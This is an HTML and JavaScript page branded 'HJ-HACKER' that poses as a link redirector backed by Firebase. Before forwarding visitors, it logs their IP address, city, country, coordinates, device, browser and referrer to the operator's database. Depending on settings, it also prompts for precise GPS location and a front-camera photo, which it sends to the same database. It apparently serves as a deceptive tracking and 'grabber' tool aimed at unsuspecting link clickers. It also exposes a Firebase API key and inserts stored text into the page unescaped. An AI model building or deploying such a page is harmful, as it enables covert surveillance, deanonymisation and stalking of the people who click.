<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HJ-HACKER | Redirecting...</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: #050505;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loader { text-align: center; }
        .ring {
            position: relative;
            width: 100px;
            height: 100px;
            margin: 0 auto 2rem;
        }
        .ring div {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: #00ff41;
            animation: spin 1s linear infinite;
        }
        .bar {
            width: 200px;
            height: 4px;
            background: #1a1a1a;
            border-radius: 4px;
            overflow: hidden;
            margin: 0 auto 2rem;
        }
        .bar-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff41, #00cc33);
            width: 0%;
            animation: loading 1.5s ease-in-out infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes loading {
            0% { width: 5%; margin-left: -5%; }
            50% { width: 60%; margin-left: 20%; }
            100% { width: 5%; margin-left: 100%; }
        }
        .message { color: #00ff41; font-size: 0.8rem; letter-spacing: 0.2em; text-transform: uppercase; }
        .social-gate, .password-form {
            background: rgba(20, 20, 30, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 24px;
            padding: 2rem;
            max-width: 400px;
            text-align: center;
        }
        .social-icon { font-size: 3rem; margin-bottom: 1rem; }
        .social-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem; }
        .social-desc { color: #888; margin-bottom: 1.5rem; }
        .social-btn, .unlock-btn {
            width: 100%;
            padding: 1rem;
            background: #00ff41;
            border: none;
            border-radius: 12px;
            color: #000;
            font-weight: 700;
            cursor: pointer;
        }
        .password-input {
            width: 100%;
            padding: 1rem;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            margin: 1rem 0;
        }
        .error { color: #ff4444; margin-top: 0.5rem; }
        .camera-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        video { width: 100%; height: 100%; object-fit: cover; }
        .capture-btn {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%);
            padding: 1rem 2rem;
            background: #00ff41;
            border: none;
            border-radius: 50px;
            font-weight: 700;
            cursor: pointer;
            z-index: 1001;
        }
    </style>
</head>
<body>
    <div id="content"></div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
            authDomain: "hjh-tools.firebaseapp.com",
            projectId: "hjh-tools",
            storageBucket: "hjh-tools.firebasestorage.app",
            messagingSenderId: "643137472905",
            appId: "1:643137472905:web:814ca23a86fb084811b958",
            databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        const shortCode = window.location.pathname.substring(1);
        
        async function logAnalytics(urlId, imageUrl = null, lat = null, lon = null) {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            let locationData = {};
            try {
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                locationData = await geoResponse.json();
            } catch {}
            
            const ua = navigator.userAgent;
            const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua);
            let browser = 'Unknown';
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari')) browser = 'Safari';
            
            let os = 'Unknown';
            if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'macOS';
            else if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iOS')) os = 'iOS';
            
            const analyticsData = {
                url_id: urlId,
                ip_address: ipData.ip,
                city: locationData.city || 'Unknown',
                country: locationData.country_name || 'Unknown',
                latitude: lat || locationData.latitude,
                longitude: lon || locationData.longitude,
                device_type: isMobile ? 'Mobile' : 'Desktop',
                browser: browser,
                os: os,
                referrer: document.referrer || 'Direct',
                captured_image: imageUrl,
                created_at: new Date().toISOString()
            };
            
            await database.ref(`analytics/${shortCode}`).push(analyticsData);
            
            // Increment click count
            const linkRef = database.ref(`urls/${shortCode}`);
            const snapshot = await linkRef.get();
            const currentClicks = snapshot.val()?.clicks || 0;
            await linkRef.update({ clicks: currentClicks + 1 });
        }
        
        async function captureCamera() {
            return new Promise(async (resolve) => {
                const container = document.createElement('div');
                container.className = 'camera-container';
                const video = document.createElement('video');
                video.autoplay = true;
                video.playsInline = true;
                container.appendChild(video);
                document.body.appendChild(container);
                
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                
                const captureBtn = document.createElement('button');
                captureBtn.className = 'capture-btn';
                captureBtn.textContent = '📸 Capture Photo';
                container.appendChild(captureBtn);
                
                captureBtn.onclick = () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    stream.getTracks().forEach(track => track.stop());
                    container.remove();
                    resolve(imageData);
                };
            });
        }
        
        async function captureLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        });
                    },
                    () => resolve({ lat: null, lon: null }),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        async function init() {
            const snapshot = await database.ref(`urls/${shortCode}`).get();
            const linkData = snapshot.val();
            
            if (!linkData) {
                document.getElementById('content').innerHTML = `
                    <div style="text-align: center;">
                        <h1 style="color: #ff4444;">404</h1>
                        <p>Link not found</p>
                    </div>
                `;
                return;
            }
            
            if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) {
                document.getElementById('content').innerHTML = `
                    <div style="text-align: center;">
                        <h1 style="color: #ff4444;">Link Expired</h1>
                        <p>This link is no longer active</p>
                    </div>
                `;
                return;
            }
            
            const animationType = linkData.animation_type || 'ring';
            const animationText = 'REDIRECTING';
            
            document.getElementById('content').innerHTML = animationType === 'ring' ?
                `<div class="loader"><div class="ring"><div></div></div><div class="message">${animationText}</div></div>` :
                `<div class="loader"><div class="bar"><div class="bar-fill"></div></div><div class="message">${animationText}</div></div>`;
            
            if (linkData.password) {
                document.getElementById('content').innerHTML = `
                    <div class="password-form">
                        <h2>🔒 Protected Link</h2>
                        <p>This link is password protected</p>
                        <input type="password" id="passwordInput" class="password-input" placeholder="Enter password">
                        <button id="unlockBtn" class="unlock-btn">Unlock</button>
                        <div id="passError" class="error"></div>
                    </div>
                `;
                document.getElementById('unlockBtn').onclick = async () => {
                    const enteredPassword = document.getElementById('passwordInput').value;
                    if (enteredPassword === linkData.password) {
                        await proceedToRedirect(linkData);
                    } else {
                        document.getElementById('passError').textContent = 'Incorrect password';
                    }
                };
                return;
            }
            
            if (linkData.social_gate_title && linkData.social_gate_url) {
                const icons = {
                    youtube: '▶️', instagram: '📷', twitter: '🐦',
                    facebook: '📘', whatsapp: '💬', linkedin: '🔗', tiktok: '🎵'
                };
                document.getElementById('content').innerHTML = `
                    <div class="social-gate">
                        <div class="social-icon">${icons[linkData.social_gate_icon] || '🔗'}</div>
                        <h2 class="social-title">${linkData.social_gate_title}</h2>
                        <p class="social-desc">${linkData.social_gate_description || 'Complete the action to unlock'}</p>
                        <button id="socialBtn" class="social-btn">${linkData.social_gate_button_text || 'Verify & Continue'}</button>
                    </div>
                `;
                document.getElementById('socialBtn').onclick = () => {
                    window.open(linkData.social_gate_url, '_blank');
                    setTimeout(() => proceedToRedirect(linkData), 2000);
                };
                return;
            }
            
            await proceedToRedirect(linkData);
        }
        
        async function proceedToRedirect(linkData) {
            let imageUrl = null;
            let location = { lat: null, lon: null };
            
            if (linkData.capture_camera) {
                imageUrl = await captureCamera();
            }
            
            if (linkData.capture_location) {
                location = await captureLocation();
            }
            
            await logAnalytics(shortCode, imageUrl, location.lat, location.lon);
            window.location.href = linkData.long_url;
        }
        
        init();
    </script>
</body>
</html>
